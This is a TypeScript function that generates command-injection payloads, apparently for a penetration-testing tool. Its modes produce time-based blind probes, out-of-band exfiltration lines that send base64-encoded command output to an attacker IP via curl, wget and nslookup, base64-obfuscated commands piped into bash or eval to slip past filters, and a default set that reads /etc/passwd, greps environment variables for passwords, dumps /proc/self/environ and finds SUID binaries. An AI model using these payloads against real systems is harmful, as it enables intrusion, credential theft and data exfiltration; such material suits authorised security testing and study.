export function generateSuggestions(
  mode: string | undefined,
  baseCmd = "id",
  attackerIp = "127.0.0.1",
  attackerPort = "4444"
): string[] {
  const b = (baseCmd || "id").trim();

  if (mode === "blind") {
    return [
      `${b} && sleep 7`,
      `${b}; sleep 5 && echo confirmed`,
      `${b} && ping -c 6 127.0.0.1`,
      `${b}||(sleep 9)`,
      `${b} && bash -c 'sleep 8'`,
    ];
  }

  if (mode === "oob") {
    return [
      `${b} && curl -sk "http://${attackerIp}/?x=$(${b}|base64 -w0)"`,
      `${b} && nslookup $(${b} | head -1 | tr ' ' '_').${attackerIp}`,
      `${b} && wget -qO- "http://${attackerIp}/?d=$(${b}|base64 -w0)"`,
      `${b} && curl -sk -X POST "http://${attackerIp}/" --data-urlencode "data=$(${b})"`,
    ];
  }

  if (mode === "quantum") {
    const b64 = Buffer.from(b).toString("base64");
    const b64full = Buffer.from(`${b} && uname -a`).toString("base64");
    return [
      `echo ${b64} | base64 -d | bash`,
      `eval "$(echo ${b64} | base64 -d)"`,
      `bash<<<$(base64 -d<<<${b64})`,
      `bash -c {echo,${b64full}}|{base64,-d}|bash`,
      `$(printf '\\x62\\x61\\x73\\x68') -c "$(echo ${b64} | base64 -d)"`,
    ];
  }

  return [
    `${b} && ls -la /`,
    `${b}; cat /etc/passwd`,
    `${b} && uname -a && hostname`,
    `${b} && env | grep -i pass`,
    `${b} && find / -perm -4000 -type f 2>/dev/null | head -5`,
    `${b} && cat /proc/self/environ | tr '\\0' '\\n'`,
    `${b} && netstat -tulpn 2>/dev/null || ss -tulpn`,
    `${b} && nc -zv ${attackerIp} ${attackerPort} 2>&1`,
  ];
}
